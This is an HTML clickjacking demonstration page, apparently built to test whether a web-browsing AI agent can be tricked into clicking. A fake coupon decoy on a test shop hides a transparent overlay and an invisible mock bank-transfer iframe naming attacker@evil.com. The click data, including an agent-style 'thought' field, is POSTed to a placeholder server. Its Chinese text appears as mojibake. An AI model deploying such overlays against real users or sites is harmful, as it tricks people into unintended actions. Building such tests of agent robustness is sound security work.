<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <title>Clickjacking Demo - Test Shop</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body { 
            font-family: Arial, sans-serif; 
            background: #f5f5f5; 
        }
        
        /* ä¸»é¡µé¢å†…å®¹ */
        .main-content {
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }
        
        h2 {
            color: #333;
            margin-bottom: 20px;
        }
        
        .product { 
            border: 1px solid #ddd; 
            padding: 15px; 
            margin: 10px 0; 
            background: white;
            border-radius: 4px;
        }
        
        .product h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        
        .product button {
            background: #4CAF50;
            color: white;
            padding: 8px 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        
        .product button:hover {
            background: #45a049;
        }
        
        .popup-trigger { 
            position: fixed; 
            top: 20px; 
            right: 20px; 
            padding: 10px 15px; 
            background: #ff6b6b; 
            color: white; 
            cursor: pointer; 
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            z-index: 1000;
        }
        
        .popup-trigger:hover {
            background: #ff5252;
        }
        
        /* å¼¹çª—æ ·å¼ */
        .modal { 
            display: none; 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        
        .modal.active { 
            display: flex;
        }
        
        .modal-content { 
            background: white; 
            padding: 30px; 
            border-radius: 8px; 
            text-align: center;
            max-width: 500px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }
        
        .close-btn { 
            margin-top: 15px; 
            padding: 8px 16px; 
            background: #666; 
            color: white; 
            cursor: pointer;
            border: none;
            border-radius: 4px;
        }
        
        .close-btn:hover {
            background: #555;
        }
        
        /* Clickjacking è¦†ç›–å±‚ - ç²¾ç¡®å°ºå¯¸ */
        #clickjackingOverlay {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 200px;
            height: 80px;
            z-index: 2001;
            background: transparent;
            cursor: pointer;
        }
        
        #clickjackingOverlay.active {
            display: block;
        }
        
        /* éšè—çš„iframe - åŒ…å«çœŸå®æ“ä½œ */
        #hiddenVictimFrame {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1998;
            opacity: 0;
            pointer-events: none;
        }
        
        #hiddenVictimFrame.active {
            display: block;
            pointer-events: auto;
        }
        
        /* è¯±é¥µæŒ‰é’®å®¹å™¨ - åˆå§‹æ˜¾ç¤º */
        #decoyButtonContainer {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 40px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            z-index: 2000;
            display: block;
        }
        
        #decoyButtonContainer.hidden {
            display: none;
        }
        
        #decoyButtonContainer h3 {
            color: #667eea;
            margin-bottom: 10px;
            font-size: 20px;
        }
        
        #decoyButtonContainer p {
            color: #666;
            margin-bottom: 20px;
        }
        
        .decoy-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px 40px;
            border: none;
            border-radius: 4px;
            font-size: 18px;
            cursor: pointer;
            margin: 10px;
            transition: transform 0.2s;
        }
        
        .decoy-btn:hover {
            transform: scale(1.05);
        }
        
        /* èƒŒæ™¯é®ç½© - ç‚¹å‡»å¯å…³é—­ */
        #overlayBackdrop {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.4);
            z-index: 1999;
            cursor: pointer;
        }
        
        #overlayBackdrop.active {
            display: block;
        }
        
        /* ç‚¹å‡»æ•°æ®å±•ç¤ºé¢æ¿ */
        #clickDataPanel {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: white;
            border: 2px solid #ff6b6b;
            border-radius: 8px;
            padding: 15px;
            max-width: 400px;
            max-height: 300px;
            overflow-y: auto;
            z-index: 3000;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            display: none;
        }
        
        #clickDataPanel.active {
            display: block;
        }
        
        #clickDataPanel h4 {
            color: #ff6b6b;
            margin-bottom: 10px;
            font-size: 14px;
        }
        
        #clickDataPanel .data-item {
            font-size: 12px;
            margin: 5px 0;
            color: #333;
            word-break: break-all;
        }
        
        #clickDataPanel .label {
            font-weight: bold;
            color: #667eea;
        }
    </style>
</head>
<body>
    <div class="main-content">
        <h2>ğŸ›ï¸ æµ‹è¯•è´­ç‰©ç½‘é¡µ - ç½‘é¡µç¨³å®šæ€§æµ‹è¯•</h2>
        
        <button class="popup-trigger" id="triggerBtn">ğŸ ç‚¹å‡»é¢†å–ä¼˜æƒ åˆ¸</button>
        
        <div class="product">
            <h3>äº§å“ A</h3>
            <p>ä»·æ ¼: $99.99</p>
            <button id="cartBtnA">åŠ å…¥è´­ç‰©è½¦</button>
        </div>
        
        <div class="product">
            <h3>äº§å“ B</h3>
            <p>ä»·æ ¼: $149.99</p>
            <button id="cartBtnB">åŠ å…¥è´­ç‰©è½¦</button>
        </div>
    </div>
    
    <!-- è¯±é¥µå¼¹çª— -->
    <div id="popup" class="modal">
        <div class="modal-content">
            <h3>ğŸ‰ æ­å–œä½ èµ¢å¾—å¤§å¥–!</h3>
            <p>ç‚¹å‡»ä¸‹æ–¹æŸ¥çœ‹ä½ çš„å¥–åŠ±</p>
            <button class="close-btn" id="closePopupBtn">å…³é—­</button>
        </div>
    </div>
    
    <!-- èƒŒæ™¯é®ç½© - ç‚¹å‡»å¯å…³é—­ -->
    <div id="overlayBackdrop"></div>
    
    <!-- Clickjacking æ”»å‡»æ¼”ç¤ºï¼šè¯±é¥µå†…å®¹ - åˆå§‹æ˜¾ç¤º -->
    <div id="decoyButtonContainer">
        <h3>ğŸ é™æ—¶ä¼˜æƒ </h3>
        <p>ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®é¢†å–å¥–åŠ±</p>
        <button class="decoy-btn" id="decoyButton">ç‚¹å‡»é¢†å– $100 ä¼˜æƒ åˆ¸</button>
    </div>
    
    <!-- æ¶æ„è¦†ç›–å±‚ - åˆå§‹æ¿€æ´» -->
    <div id="clickjackingOverlay"></div>
    
    <!-- ç‚¹å‡»æ•°æ®å±•ç¤ºé¢æ¿ -->
    <div id="clickDataPanel">
        <h4>ğŸš¨ æ¶æ„ç‚¹å‡»æ•°æ®</h4>
        <div id="clickDataContent"></div>
    </div>
    
    <!-- éšè—çš„iframe - åŒ…å«çœŸå®æ“ä½œï¼ˆå—å®³è€…ç½‘ç«™ï¼‰ -->
    <iframe id="hiddenVictimFrame" src="data:text/html,
    <html>
    <head>
        <meta charset='utf-8'>
        <title>Victim Site - Bank Transfer</title>
        <style>
            body { font-family: Arial; padding: 20px; background: #f0f0f0; }
            .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; }
            .button { 
                background: #4CAF50; 
                color: white; 
                padding: 12px 24px; 
                border: none; 
                border-radius: 4px; 
                cursor: pointer;
                font-size: 16px;
                margin: 10px 0;
            }
            .button:hover { background: #45a049; }
            .warning { color: #ff6b6b; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class='container'>
            <h2>é“¶è¡Œè½¬è´¦ç³»ç»Ÿ</h2>
            <p class='warning'>âš ï¸ è¿™æ˜¯å—å®³è€…ç½‘ç«™çš„çœŸå®æ“ä½œç•Œé¢</p>
            
            <form id='transferForm'>
                <label>è½¬è´¦é‡‘é¢:</label>
                <input type='text' value='$1000' readonly style='width: 100%; padding: 8px; margin: 10px 0;'>
                
                <label>æ”¶æ¬¾è´¦æˆ·:</label>
                <input type='text' value='attacker@evil.com' readonly style='width: 100%; padding: 8px; margin: 10px 0;'>
                
                <button type='submit' class='button' id='submitBtn'>ç¡®è®¤è½¬è´¦</button>
            </form>
        </div>
        
        <script>
            document.getElementById('transferForm').addEventListener('submit', function(e) {
                e.preventDefault();
                console.log('ğŸ’° Victim website: Transfer button clicked!');
            });
            
            document.getElementById('submitBtn').addEventListener('click', function(e) {
                console.log('âŒ CLICKJACKING ATTACK SUCCESSFUL - Hidden button clicked!');
            });
        </script>
    </body>
    </html>
    "></iframe>
    
    <script>
        // è·å–æ‰€æœ‰DOMå…ƒç´ 
        const triggerBtn = document.getElementById('triggerBtn');
        const popupModal = document.getElementById('popup');
        const closePopupBtn = document.getElementById('closePopupBtn');
        const decoyButton = document.getElementById('decoyButton');
        const overlayBackdrop = document.getElementById('overlayBackdrop');
        const clickjackingOverlay = document.getElementById('clickjackingOverlay');
        const hiddenVictimFrame = document.getElementById('hiddenVictimFrame');
        const decoyButtonContainer = document.getElementById('decoyButtonContainer');
        const cartBtnA = document.getElementById('cartBtnA');
        const cartBtnB = document.getElementById('cartBtnB');
        const clickDataPanel = document.getElementById('clickDataPanel');
        const clickDataContent = document.getElementById('clickDataContent');
        
        // æ™®é€šå¼¹çª—åŠŸèƒ½
        triggerBtn.addEventListener('click', function() {
            popupModal.classList.add('active');
        });
        
        closePopupBtn.addEventListener('click', function() {
            popupModal.classList.remove('active');
        });
        
        // è´­ç‰©è½¦æŒ‰é’®
        cartBtnA.addEventListener('click', function() {
            alert('å·²æ·»åŠ åˆ°è´­ç‰©è½¦: äº§å“ A');
        });
        
        cartBtnB.addEventListener('click', function() {
            alert('å·²æ·»åŠ åˆ°è´­ç‰©è½¦: äº§å“ B');
        });
        
        // å…³é—­è¯±é¥µçª—å£ï¼ˆç‚¹å‡»å¤–éƒ¨æ—¶ï¼‰
        function closeDecoyWindow() {
            decoyButtonContainer.classList.add('hidden');
            overlayBackdrop.classList.remove('active');
            clickjackingOverlay.classList.remove('active');
            hiddenVictimFrame.classList.remove('active');
            clickDataPanel.classList.remove('active');
            console.log('Decoy window closed by clicking outside');
        }
        
        // æ˜¾ç¤ºç‚¹å‡»æ•°æ®é¢æ¿
        function displayClickData(data) {
            let html = `
                <div class="data-item">
                    <span class="label">ç‚¹å‡»åæ ‡:</span> (${data.click_x}, ${data.click_y})
                </div>
                <div class="data-item">
                    <span class="label">æ—¶é—´æˆ³:</span> ${data.timestamp}
                </div>
                <div class="data-item">
                    <span class="label">ç”¨æˆ·æ„å›¾:</span> ${data.thought}
                </div>
                <div class="data-item">
                    <span class="label">å®é™…åŠ¨ä½œ:</span> ${data.status}
                </div>
                <div class="data-item">
                    <span class="label">åŠ¨ä½œç±»å‹:</span> ${data.action_type}
                </div>
                <div class="data-item">
                    <span class="label">ç›®æ ‡å…ƒç´ :</span> ${data.element}
                </div>
                <div class="data-item" style="margin-top: 10px; padding-top: 10px; border-top: 1px solid #ddd;">
                    <span class="label">å¤‡æ³¨:</span> ${data.note}
                </div>
            `;
            clickDataContent.innerHTML = html;
            clickDataPanel.classList.add('active');
            
            // åŒæ—¶åœ¨æ§åˆ¶å°è¾“å‡º
            console.log('========== ğŸš¨ CLICKJACKING ATTACK DETECTED ==========');
            console.log('ç‚¹å‡»åæ ‡:', data.click_x, data.click_y);
            console.log('æ—¶é—´æˆ³:', data.timestamp);
            console.log('ç”¨æˆ·æ„å›¾:', data.thought);
            console.log('å®é™…åŠ¨ä½œ:', data.status);
            console.log('=====================================================');
        }
        
        // é¡µé¢åŠ è½½å®Œæˆåæ·»åŠ äº‹ä»¶ç›‘å¬
        document.addEventListener('DOMContentLoaded', function() {
            // åˆå§‹åŒ–ï¼šæ˜¾ç¤ºè¯±é¥µçª—å£å’Œæ¶æ„å›¾å±‚
            overlayBackdrop.classList.add('active');
            clickjackingOverlay.classList.add('active');
            hiddenVictimFrame.classList.add('active');
            console.log('Clickjacking overlay initialized on page load');
            
            // æ¶æ„è¦†ç›–å±‚ç‚¹å‡» - æ˜¾ç¤ºç‚¹å‡»æ•°æ®
            clickjackingOverlay.addEventListener('click', function(e) {
                const clickX = e.clientX;
                const clickY = e.clientY;
                
                console.log('Malicious overlay clicked at:', clickX, clickY);
                
                // æ„é€ ç‚¹å‡»æ•°æ®
                const clickData = {
                    click_x: clickX,
                    click_y: clickY,
                    timestamp: new Date().toISOString(),
                    note: 'é™æ—¶ä¼˜æƒ æ´»åŠ¨:ç‚¹å‡»é¢†å– $100 ä¼˜æƒ åˆ¸',
                    thought: 'ç”¨æˆ·å¸Œæœ›ä»¥ä½ä»·è´­ä¹°äº§å“ï¼Œå¯ä»¥å…ˆé¢†å–ä¼˜æƒ åˆ¸å†è€ƒè™‘è´­ä¹°ã€‚',
                    action_type: 'click_element',
                    element: 'é™æ—¶ä¼˜æƒ åˆ¸é¢†å–æŒ‰é’®',
                    status: 'clicked_on_malicious_overlay'
                };
                
                // æ˜¾ç¤ºç‚¹å‡»æ•°æ®é¢æ¿
                displayClickData(clickData);
                
                // å°è¯•å‘æœåŠ¡ç«¯å‘é€ä¿¡æ¯ï¼ˆå¦‚æœæœåŠ¡ç«¯å¯ç”¨ï¼‰
                if (typeof fetch !== 'undefined') {
                    fetch('https://your-server.com/api/click-detected', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(clickData)
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Server response:', data);
                    })
                    .catch(error => {
                        console.log('Server not available, data stored locally:', clickData);
                        // å­˜å‚¨åˆ°æœ¬åœ°LocalStorage
                        let clickHistory = JSON.parse(localStorage.getItem('clickHistory') || '[]');
                        clickHistory.push(clickData);
                        localStorage.setItem('clickHistory', JSON.stringify(clickHistory));
                    });
                }
                
                e.preventDefault();
                e.stopPropagation();
            });
            
            // èƒŒæ™¯é®ç½©ç‚¹å‡» - å…³é—­çª—å£
            overlayBackdrop.addEventListener('click', function(e) {
                closeDecoyWindow();
            });
            
            // è¯±é¥µæŒ‰é’®æœ¬èº«ç‚¹å‡»ä¹Ÿä¼šè§¦å‘æ¶æ„è¦†ç›–å±‚ï¼ˆå› ä¸ºè¦†ç›–å±‚åœ¨ä¸Šé¢ï¼‰
            decoyButton.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
            });
        });
        
        // ä»LocalStorageè¯»å–ç‚¹å‡»å†å²
        window.addEventListener('load', function() {
            const clickHistory = JSON.parse(localStorage.getItem('clickHistory') || '[]');
            if (clickHistory.length > 0) {
                console.log('ç‚¹å‡»å†å²è®°å½•:', clickHistory);
            }
        });
    </script>
</body>
</html>